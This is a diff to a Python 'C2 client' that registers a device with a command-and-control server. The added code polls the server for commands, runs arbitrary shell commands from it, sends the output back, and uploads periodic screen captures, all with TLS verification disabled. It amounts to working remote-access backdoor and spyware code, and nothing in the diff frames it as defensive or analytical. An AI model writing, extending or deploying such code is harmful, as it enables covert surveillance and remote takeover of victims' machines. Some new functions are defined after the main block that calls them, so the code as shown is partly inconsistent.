@@ -24,9 +24,14 @@ CONFIG_FILE = "device_config.json"
 screencap_thread = None
 screencap_stop_event = threading.Event()
 
+# Global variable to store the API key
+DEVICE_API_KEY = None
+
 def get_device_config(name: str):
+    global DEVICE_API_KEY
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, 'r') as f: config = json.load(f)
+        DEVICE_API_KEY = config.get("api_key")
         print(f"Device config loaded. ID: {config.get('id')}")
         return config
     try:
@@ -34,6 +39,7 @@ def get_device_config(name: str):
         response = requests.post(f"{C2_URL}/register", json=payload)
         response.raise_for_status()
         config = response.json()
+        DEVICE_API_KEY = config.get("api_key")
         with open(CONFIG_FILE, 'w') as f: json.dump(config, f, indent=4)
         print(f"Device registered successfully! ID: {config.get('id')}")
         return config
@@ -236,7 +242,7 @@ if __name__ == "__main__":
         C2_URL = f"{args.c2_url}/api"
     else:
         # Default for non-install commands if not provided
-        C2_URL = "http://127.0.0.1:8000/api" # This default is only for local testing/direct run
+        C2_URL = "https://127.0.0.1:8000/api" # Changed to HTTPS
 
     if args.command == "install":
         if not args.c2_url:
@@ -250,3 +256,73 @@ if __name__ == "__main__":
             main_loop(config)
         else:
             print("Could not start client.")
+
+def _make_request(method: str, endpoint: str, **kwargs):
+    """Helper to make authenticated requests to the C2 server."""
+    headers = kwargs.pop("headers", {})
+    if DEVICE_API_KEY:
+        headers["X-API-Key"] = DEVICE_API_KEY
+    
+    # Disable SSL verification for self-signed certs in development/testing
+    # In production, this should be 'verify=True' and a proper CA-signed cert
+    kwargs["verify"] = False 
+
+    return requests.request(method, f"{C2_URL}{endpoint}", headers=headers, **kwargs)
+
+def screencap_worker(device_id):
+    global screencap_stop_event
+    print("Screen capture thread started.")
+    while not screencap_stop_event.is_set():
+        try:
+            # Grab the 128x128 screen content at position (0,0)
+            image = ImageGrab.grab(bbox=(0, 0, 128, 128))
+            
+            img_byte_arr = io.BytesIO()
+            image.save(img_byte_arr, format='JPEG')
+            
+            _make_request(
+                "POST",
+                "/screen", # Endpoint changed to /screen
+                data=img_byte_arr.getvalue(),
+                headers={'Content-Type': 'image/jpeg'},
+                timeout=2
+            )
+        except Exception as e:
+            print(f"Error in screencap_worker: {e}")
+        time.sleep(1)
+    print("Screen capture thread stopped.")
+
+def submit_result(device_id: str, task_id: int, output: str):
+    try:
+        payload = {"task_id": task_id, "output": output}
+        _make_request("POST", "/results", json=payload) # Endpoint changed to /results
+    except requests.RequestException as e:
+        print(f"Error submitting result: {e}")
+
+def main_loop(device_config):
+    device_id = device_config.get("id")
+    if not device_id: return
+
+    print(f"Starting C2 client for device {device_id}. Polling for commands...")
+    while True:
+        try:
+            tasks = _make_request("GET", "/commands").json() # Endpoint changed to /commands
+            if tasks:
+                for task in tasks:
+                    task_id, command = task.get("id"), task.get("command")
+                    
+                    if command == "c2_screencap_start":
+                        start_screencap(device_id)
+                        submit_result(device_id, task_id, "Screen capture started.")
+                    elif command == "c2_screencap_stop":
+                        stop_screencap()
+                        submit_result(device_id, task_id, "Screen capture stopped.")
+                    elif command.startswith("c2_"):
+                        output = execute_c2_command(command)
+                        submit_result(device_id, task_id, output)
+                    else:
+                        output = execute_shell_command(command)
+                        submit_result(device_id, task_id, output)
+        except Exception as e:
+            print(f"Error in main loop: {e}")
+        time.sleep(10)
